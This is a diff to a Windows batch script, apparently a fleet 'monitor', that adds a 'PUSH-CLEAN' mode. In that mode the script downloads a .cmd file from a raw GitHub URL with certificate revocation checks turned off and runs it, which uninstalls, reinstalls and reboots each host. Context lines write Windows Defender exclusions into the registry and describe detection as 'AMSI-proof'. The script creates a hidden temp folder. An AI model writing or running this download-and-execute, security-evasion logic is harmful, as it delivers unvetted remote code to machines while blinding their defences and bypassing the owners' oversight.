@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M67
+rem  OWN_MON  BUILD 20260804M68
+rem  M68: PUSH-CLEAN exception under NO_INSTALL — one clean uninstall+install+reboot per host (gryxa_clean_install).
 rem  M67: NO_INSTALL freeze — no auto msiexec/HEAL/REINSTALL/PUSH-START; watcher stays ON.
 rem  M66: NEVER sc stop Gryxa on force (M64 bounce left 60+ Stopped when Guest killed mon mid-tick).
 rem       PUSH-START/RECONNECT = detached start-only; Stopped → multi-start no HEAL.
@@ -73,7 +74,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "Scre
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M63"
+set "MONVER=M68"
 set "MON_MIN=M62"
 set "GIT_PIN="
 set "CHANNEL_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/fleet_channel.cfg?t=%RANDOM%%RANDOM%"
@@ -651,13 +652,15 @@ if exist "%WD%\force_gryxa.new" (
     )
   )
 )
-rem M67: NO_INSTALL kills all force. OBSERVE blocks classic REINSTALL force only.
+rem M67/M68: NO_INSTALL kills normal force; PUSH-CLEAN is the one allowed campaign
 set "FORCE_RECONNECT=0"
+set "FORCE_CLEAN=0"
 if exist "%WD%\force_gryxa.new" (
   findstr /C:"RECONNECT" /C:"PUSH-START" "%WD%\force_gryxa.new" >nul 2>&1 && set "FORCE_RECONNECT=1"
+  findstr /C:"PUSH-CLEAN" /C:"CLEAN_INSTALL" "%WD%\force_gryxa.new" >nul 2>&1 && set "FORCE_CLEAN=1"
 )
-if "!NO_INSTALL!"=="1" set "FORCE_G=0"
-if "!OBSERVE!"=="1" if "!FORCE_RECONNECT!"=="0" set "FORCE_G=0"
+if "!NO_INSTALL!"=="1" if "!FORCE_CLEAN!"=="0" set "FORCE_G=0"
+if "!OBSERVE!"=="1" if "!FORCE_RECONNECT!"=="0" if "!FORCE_CLEAN!"=="0" set "FORCE_G=0"
 
 rem Detect Gryxa — CMD first (AMSI-proof). Only trust PS health if line starts with HEALTHY|BROKEN|STUCK|ABSENT|
 set "GH="
@@ -705,8 +708,14 @@ if "!GRYXA_OK!"=="0" if exist "%WD%\own_lib.ps1" (
 )
 echo gryxa_health=!GH!>>"%LOG%"
 
-rem FORCE: disabled entirely under NO_INSTALL; otherwise PUSH-START/RECONNECT start-only (never sc stop)
+rem FORCE: PUSH-CLEAN allowed under NO_INSTALL (one clean install+reboot). Else blocked / start-only.
 if "%FORCE_G%"=="1" (
+  if "!FORCE_CLEAN!"=="1" (
+    echo gryxa_force_PUSH_CLEAN observe=!OBSERVE! no_install=!NO_INSTALL!>>"%LOG%"
+    call :QueueGryxaCleanInstall
+    if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
+    goto :GryxaAfter
+  )
   if "!NO_INSTALL!"=="1" (
     echo gryxa_force_blocked_NO_INSTALL>>"%LOG%"
     if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
@@ -1022,6 +1031,26 @@ call :ParseGryxaNum "%~1"
 if "!_PN!"=="" set "_PN=0"
 if !_PN! LSS !GRYXA_FLOOR! exit /b 1
 if !_PN! EQU 0 exit /b 1
+exit /b 0
+
+:QueueGryxaCleanInstall
+rem M68: pull gryxa_clean_install.cmd and run once (uninstall+install+one reboot). Sevrz keepers untouched.
+echo gryxa_clean_install_queue>>"%LOG%"
+if not exist "%SystemRoot%\Temp\.upd" mkdir "%SystemRoot%\Temp\.upd" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 45 -o "%WD%\gryxa_clean_install.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/gryxa_clean_install.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+if not exist "%WD%\gryxa_clean_install.cmd" (
+  echo gryxa_clean_install_fetch_fail>>"%LOG%"
+  exit /b 1
+)
+findstr /C:"GRYXA_CLEAN_INSTALL R1" "%WD%\gryxa_clean_install.cmd" >nul 2>&1
+if errorlevel 1 (
+  echo gryxa_clean_install_bad_marker>>"%LOG%"
+  exit /b 1
+)
+rem clear prior reboot marker so this campaign may reboot once
+del /f /q "%WD%\gryxa_clean_rebooted.flag" >nul 2>&1
+call "%WD%\gryxa_clean_install.cmd"
+echo gryxa_clean_install_launched>>"%LOG%"
 exit /b 0
 
 :QueueGryxaStartOnly
